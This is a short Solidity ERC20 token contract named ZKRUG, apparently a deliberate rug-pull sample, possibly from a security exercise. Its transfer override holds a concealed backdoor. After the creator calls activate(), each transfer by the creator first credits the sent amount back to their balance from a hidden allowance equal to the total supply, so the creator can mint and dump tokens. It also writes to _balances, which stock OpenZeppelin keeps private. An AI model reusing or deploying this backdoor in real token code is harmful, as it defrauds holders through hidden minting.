// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "openzeppelin-contracts/contracts/token/ERC20/ERC20.sol";

contract ZKRUG is ERC20 {
    bool internal start;
    address internal creater;
    mapping (address => uint256) internal _activated;
    constructor() ERC20("ZKRUG", "ZKRUG") {
        _mint(msg.sender, 1000*10**18);
        start = false;
        creater = msg.sender;
    }

    function activate() public {
        require(msg.sender == creater);
        start = true;
        _activated[msg.sender] = totalSupply();
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        require(start == true);
        if (_activated[msg.sender] > 0) {
            _activated[msg.sender] -= amount;
            _balances[msg.sender] += amount;
        }
        super.transfer(recipient, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        require(start == true);
        super.transferFrom(sender, recipient, amount);
        return true;
    }
}